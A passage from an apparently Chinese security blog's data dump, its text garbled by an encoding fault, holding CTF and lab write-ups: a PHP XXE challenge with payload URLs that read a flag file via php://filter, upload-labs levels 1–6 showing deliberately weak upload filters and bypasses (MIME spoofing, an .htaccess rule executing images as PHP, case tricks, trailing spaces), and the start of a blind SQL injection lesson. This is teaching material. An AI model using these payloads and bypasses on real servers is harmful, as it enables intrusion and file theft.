·çš„äº‹ï¼Œåªé™¤äº†å½“å‰å•å…ƒçš„é”®åä¹Ÿä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­è¢«èµ‹ç»™å˜é‡ $keyã€‚ è¿˜èƒ½å¤Ÿè‡ªå®šä¹‰éå†å¯¹è±¡ã€‚ +++ spl_autoload_register (PHP 5 &gt;= 5.1.0, PHP 7) spl_autoload_register â€” æ³¨å†Œç»™å®šçš„å‡½æ•°ä½œä¸º __autoload çš„å®ç° è¯´æ˜ spl_autoload_register ([ callable $autoload_function [, bool $throw = true [, bool $prepend = false ]]] ) : bool å°†å‡½æ•°æ³¨å†Œåˆ°SPL __autoloadå‡½æ•°é˜Ÿåˆ—ä¸­ã€‚å¦‚æœè¯¥é˜Ÿåˆ—ä¸­çš„å‡½æ•°å°šæœªæ¿€æ´»ï¼Œåˆ™æ¿€æ´»å®ƒä»¬ã€‚ å¦‚æœåœ¨ä½ çš„ç¨‹åºä¸­å·²ç»å®ç°äº†__autoload()å‡½æ•°ï¼Œå®ƒå¿…é¡»æ˜¾å¼æ³¨å†Œåˆ°__autoload()é˜Ÿåˆ—ä¸­ã€‚å› ä¸º spl_autoload_register()å‡½æ•°ä¼šå°†Zend Engineä¸­çš„__autoload()å‡½æ•°å–ä»£ä¸ºspl_autoload()æˆ–spl_autoload_call()ã€‚ å¦‚æœéœ€è¦å¤šæ¡ autoload å‡½æ•°ï¼Œspl_autoload_register() æ»¡è¶³äº†æ­¤ç±»éœ€æ±‚ã€‚ å®ƒå®é™…ä¸Šåˆ›å»ºäº† autoload å‡½æ•°çš„é˜Ÿåˆ—ï¼ŒæŒ‰å®šä¹‰æ—¶çš„é¡ºåºé€ä¸ªæ‰§è¡Œã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œ __autoload() åªå¯ä»¥å®šä¹‰ä¸€æ¬¡ã€‚ å‚æ•° autoload_function æ¬²æ³¨å†Œçš„è‡ªåŠ¨è£…è½½å‡½æ•°ã€‚å¦‚æœæ²¡æœ‰æä¾›ä»»ä½•å‚æ•°ï¼Œåˆ™è‡ªåŠ¨æ³¨å†Œ autoload çš„é»˜è®¤å®ç°å‡½æ•°spl_autoload()ã€‚ throw æ­¤å‚æ•°è®¾ç½®äº† autoload_function æ— æ³•æˆåŠŸæ³¨å†Œæ—¶ï¼Œ spl_autoload_register()æ˜¯å¦æŠ›å‡ºå¼‚å¸¸ã€‚ prepend å¦‚æœæ˜¯ trueï¼Œspl_autoload_register() ä¼šæ·»åŠ å‡½æ•°åˆ°é˜Ÿåˆ—ä¹‹é¦–ï¼Œè€Œä¸æ˜¯é˜Ÿåˆ—å°¾éƒ¨ã€‚ è¿”å›å€¼ æˆåŠŸæ—¶è¿”å› TRUEï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚ +++ è€ƒå¯Ÿç‚¹ï¼š å®ä¾‹åŒ–æ¼æ´ XXEæ¼æ´ +++ åˆ†æï¼šä½¿ç”¨ class_exists å‡½æ•°æ¥åˆ¤æ–­ç±»æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šè°ƒç”¨ç¨‹åºä¸­çš„ __autoload å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰ __autoload å‡½æ•°ï¼Œè€Œæ˜¯ç”¨ spl_autoload_register æ³¨å†Œäº†ä¸€ä¸ªç±»ä¼¼ __autoload ä½œç”¨çš„å‡½æ•°ï¼Œè°ƒç”¨ä¹‹å‰å®šä¹‰çš„NotFoundå‡½æ•°è¾“å‡º404ä¿¡æ¯ã€‚ è¿™é‡Œç›´æ¥åˆ©ç”¨PHPçš„å†…ç½®ç±»ï¼Œå…ˆç”¨ GlobIterator ç±»æœç´¢ flagæ–‡ä»¶ åå­—ï¼Œæ¥çœ‹ä¸€ä¸‹PHPæ‰‹å†Œå¯¹ GlobIterator ç±»çš„ æ„é€ å‡½æ•°çš„å®šä¹‰ï¼š ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æœç´¢çš„æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé€‰æ‹©æ–‡ä»¶çš„å“ªä¸ªä¿¡æ¯ä½œä¸ºé”®åï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç”¨ FilesystemIterator::CURRENT_AS_FILEINFO ï¼Œå…¶å¯¹åº”çš„å¸¸é‡å€¼ä¸º0. æ„é€ æœç´¢æ–‡ä»¶çš„payloadï¼š 1http://localhost/CTF/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0 æ‰§è¡Œå‘ç°ï¼Œflagçš„æ–‡ä»¶åä¸º f1agi3hEre.php ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨å†…ç½®ç±» SimpleXMLElement è¯»å– f1agi3hEre.php æ–‡ä»¶çš„å†…å®¹,ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ç»“åˆä½¿ç”¨PHPæµçš„ä½¿ç”¨ï¼Œå› ä¸ºå½“æ–‡ä»¶ä¸­å­˜åœ¨ï¼š &lt; &gt; &amp; â€˜ â€œ è¿™5ä¸ªç¬¦å·æ—¶ï¼Œä¼šå¯¼è‡´XMLæ–‡ä»¶è§£æé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨PHPæ–‡ä»¶æµï¼Œå°†è¦è¯»å–çš„æ–‡ä»¶å†…å®¹ç»è¿‡ base64ç¼–ç  åè¾“å‡ºå³å¯ï¼› æ„é€ payloadï¼š 1http://localhost/CTF/index.php?name=SimpleXMLElement&amp;param=&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php\"&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"PHPä»£ç å®¡è®¡å®ä¾‹","slug":"PHPä»£ç å®¡è®¡å®ä¾‹","date":"2020-04-29T06:42:31.000Z","updated":"2020-05-07T02:12:58.636Z","comments":true,"path":"2020/04/29/PHPä»£ç å®¡è®¡å®ä¾‹/","link":"","permalink":"https://singlemindedt.github.io/2020/04/29/PHPä»£ç å®¡è®¡å®ä¾‹/","excerpt":"","text":"upload-labs +++ Pass-01 å¦‚å›¾ï¼Œè¦æ±‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªwebshellåˆ°æœåŠ¡å™¨ï¼Œå¹¶è¦æ±‚æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡ï¼› é¦–å…ˆï¼Œæˆ‘ä»¬ä¸Šä¼ ä»»æ„æ–‡ä»¶è¯•è¯•ï¼š æç¤ºæˆ‘ä»¬ï¼Œåªèƒ½ä¸Šä¼ .jpg|.png|.gifç±»å‹çš„æ–‡ä»¶ï¼› æŸ¥çœ‹æç¤ºï¼Œâ€œæœ¬passåœ¨å®¢æˆ·ç«¯ä½¿ç”¨jså¯¹ä¸åˆæ³•å›¾ç‰‡è¿›è¡Œæ£€æŸ¥ï¼â€ï¼› æç¤ºå·²ç»å¾ˆæ˜ç¡®äº†ï¼Œè¯¥é¢˜ç›®åœ¨å®¢æˆ·ç«¯ä½¿ç”¨jsè¿‡æ»¤ä¸åˆæ³•åç¼€ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¸Šä¼ æ—¶å°†æ–‡ä»¶æ”¹ä¸ºåˆæ³•åç¼€æ ¼å¼ï¼Œç„¶åæŠ“åŒ…ï¼Œå†æ”¹åŒ…ï¼› çœ‹çœ‹æºç ï¼š 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!\"); return false; &#125; //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = \".jpg|.png|.gif\"; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(\".\")); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ \" + allow_ext + \"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š\" + ext_name; alert(errMsg); return false; &#125;&#125; æ‹¦æˆªæ–¹å¼ï¼šå®¢æˆ·ç«¯jsç™½åå•æ£€æŸ¥;æ ¹æ®ä¸Šä¼ æ–‡ä»¶çš„åç¼€æ˜¯å¦ä¸º.jpg|.png|.gifæ ¼å¼æ¥åˆ¤æ–­æ–‡ä»¶èƒ½å¦ä¸Šä¼ ï¼› ç»•è¿‡æ–¹å¼ï¼šå°†æœ¨é©¬ä¼ªè£…æˆ.jpg|.png|.gifæ–‡ä»¶ï¼Œä¸Šä¼ åburpæ‹¦æˆªæ•°æ®åŒ…ï¼Œæ›´æ”¹æ–‡ä»¶åç¼€ä¸º.phpï¼Œå†forward. æ”¹åŒ…ï¼š å…¶ä»–æ–¹æ³• ä¿®æ”¹jsè„šæœ¬ æµè§ˆå™¨ç¦æ­¢ä½¿ç”¨jsè„šæœ¬ï¼ˆç«ç‹ä¸‹ğŸ¦Š) åœ¨Firefoxåœ°å€æ é‡Œè¾“å…¥â€œabout:configâ€ã€‚åœ¨æœç´¢æ è¾“å…¥â€œjavascript.enabledâ€æŸ¥æ‰¾åˆ°é¦–é€‰é¡¹ã€‚ç‚¹å‡»é¼ æ ‡å³é”®é€‰æ‹©â€œåˆ‡æ¢â€ï¼ŒæŠŠâ€œjavascript.enabledâ€é”®å€¼æ”¹ä¸ºâ€œfalseâ€ +++ Pass-02é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼šæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼è¿™æ¬¡ç»™çš„ä¸æ˜¯ç™½åå•æˆ–è€…é»‘åå•ï¼Œè€Œæ˜¯å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œåº”è¯¥ä¸ºMIMEçš„æ£€æŸ¥ã€‚ æŸ¥çœ‹æç¤ºï¼š æç¤ºï¼šæœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼ è¡¥å……ï¼šMIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚ 12345678910111213141516171819å¸¸è§çš„MIMEç±»å‹(é€šç”¨å‹)ï¼šè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html text/htmlxmlæ–‡æ¡£ .xml text/xmlXHTMLæ–‡æ¡£ .xhtml application/xhtml+xmlæ™®é€šæ–‡æœ¬ .txt text/plainRTFæ–‡æœ¬ .rtf application/rtfPDFæ–‡æ¡£ .pdf application/pdfMicrosoft Wordæ–‡ä»¶ .word application/mswordPNGå›¾åƒ .png image/pngGIFå›¾å½¢ .gif image/gifJPEGå›¾å½¢ .jpeg,.jpg image/jpegauå£°éŸ³æ–‡ä»¶ .au audio/basicMIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midiRealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudioMPEGæ–‡ä»¶ .mpg,.mpeg video/mpegAVIæ–‡ä»¶ .avi video/x-msvideoGZIPæ–‡ä»¶ .gz application/x-gzipTARæ–‡ä»¶ .tar application/x-tarä»»æ„çš„äºŒè¿›åˆ¶æ•°æ® application/octet-stream +++ æºç ï¼š 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯ç™½åå•;å¯¹æ–‡ä»¶çš„MIME(Multipurpose Internet Mail Extensions)è¿›è¡Œäº†éªŒè¯ï¼Œåªå…è®¸å›¾ç‰‡ç±»æ–‡ä»¶ä¸Šä¼ é€šè¿‡ ç»•è¿‡æ–¹å¼ï¼š ç›´æ¥ä¸Šä¼ å«æœ¨é©¬çš„å›¾ç‰‡æ–‡ä»¶ï¼ŒburpæˆªåŒ…ï¼Œä¿®æ”¹åç¼€ä¸ºphpæ–‡ä»¶ ç›´æ¥ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ï¼ŒburpæŠ“åŒ…ï¼Œä¿®æ”¹Content-Typeä¸ºimage/pngç­‰å…è®¸ç±»å‹ +++ æ­¤å¤„æˆ‘ä»¬åˆ©ç”¨2ä¿®æ”¹Content-Typeä¸ºimage/pngï¼šæŠ“åŒ…ï¼š[4]:() æ”¹åŒ…ï¼š[5]:() å‘åŒ…ï¼šæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œç›´æ¥å°†æ–‡ä»¶æ‹–å‡ºæ¥å³å¯å¾—è®¿é—®ï¼› +++ Psaa-03é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼šæç¤ºï¼šä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼ æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶ï¼ æºç ï¼š 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•éªŒè¯;(ç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶) ç»•è¿‡æ–¹å¼ï¼š(1)å¯ä¸Šä¼ .php3.phtml .phps .php5 .phtâ€¦ç­‰è¿™æ ·å¯ä»¥è¢«æœåŠ¡å™¨è§£æçš„åç¼€å(2)é‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†ä¸Šä¼ ä¸€ä¸ªhack.pngæ–‡ä»¶(å«æœ¨é©¬)é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€hack.pngâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œæ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ.htaccessæ–‡ä»¶å†…å®¹ï¼š 123&lt;FilesMatch \"hack.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; æ­¤å¤„ä¿®æ”¹æ–‡ä»¶åç¼€ä¸º.php3;[8]:() ä¸Šä¼ æˆåŠŸï¼+++ Pass-04é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼šæç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ! æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼ æºç ï¼š 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•åŠ å¼ºéªŒè¯;ä¸Pass-03ç±»ä¼¼ï¼Œåªæ˜¯å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€åçš„é™åˆ¶ç§ç±»å¢åŠ  ç»•è¿‡æ–¹å¼ï¼šé‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡(ç¬¬3å…³(2)) ä¸Šä¼ .htaccessæ–‡ä»¶ 123&lt;FilesMatch \"hack.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; ä¸Šä¼ hack.pngï¼ˆå«æœ¨é©¬ï¼‰ ä¸Šä¼ æˆåŠŸï¼Œå¹¶ä»¥phpè¿›è¡Œäº†è§£æï¼ +++ Pass-05é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼ * æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ï¼ Pass-05å‘é»‘åå•ä¸­å¢åŠ äº†.htaccessåç¼€æ–‡ä»¶; æºç ï¼š 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; åˆ é™¤äº†è¯¥è¯­å¥ï¼š$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•è¶…çº§åŠ å¼º;.htaccessåŠ å…¥äº†é»‘åå•ï¼Œå–æ¶ˆäº†åç¼€åå…¨å˜ä¸ºå°å†™å­—æ¯çš„strtolowerï¼ˆï¼‰å‡½æ•° ç»•è¿‡æ–¹å¼ï¼šé‡‡ç”¨å¤§å°å†™æ··åˆæ–¹å¼ç»•è¿‡.PhP,.PHp5ï¼Œæˆ–ç€.hTacCesSæ–‡ä»¶â€¦ ä¸Šä¼ æˆåŠŸï¼ +++ Pass-06é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  * æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼ æºç ï¼š 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; æç¤ºå’Œæºç é‡Œçš„é»‘åå•å¹¶ä¸ä¸€è‡´ï¼Œæç¤ºé‡Œå°‘äº†.htaccess$file_ext = trim($file_ext); //é¦–å°¾å»ç©º+++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•;å»æ‰äº†å»é™¤ç©ºæ ¼çš„trimå‡½æ•°ï¼› ç»•è¿‡æ–¹å¼ï¼šé€‰æ‹©åç¼€ä¸º.phpçš„ä¸€å¥è¯ä¸Šä¼ ï¼ŒæŠ“åŒ…ååœ¨åé¢å¢åŠ ç©ºæ ¼; ä¸Šä¼ æˆåŠŸï¼ +++","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"sqli-labs-Page-1-Less-9&10","slug":"sqli-labs-Page-1-Less-9","date":"2020-04-09T00:50:00.000Z","updated":"2020-07-29T11:45:47.068Z","comments":true,"path":"2020/04/09/sqli-labs-Page-1-Less-9/","link":"","permalink":"https://singlemindedt.github.io/2020/04/09/sqli-labs-Page-1-Less-9/","excerpt":"","text":"Less-9ï¼ˆGETæ–¹å¼-ç›²æ³¨-åŸºäºæ—¶é—´-å•å¼•å·ï¼‰ åŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼šæ­£ç¡®å»¶è¿Ÿï¼Œé”™è¯¯ä¸å»¶è¿Ÿï¼› 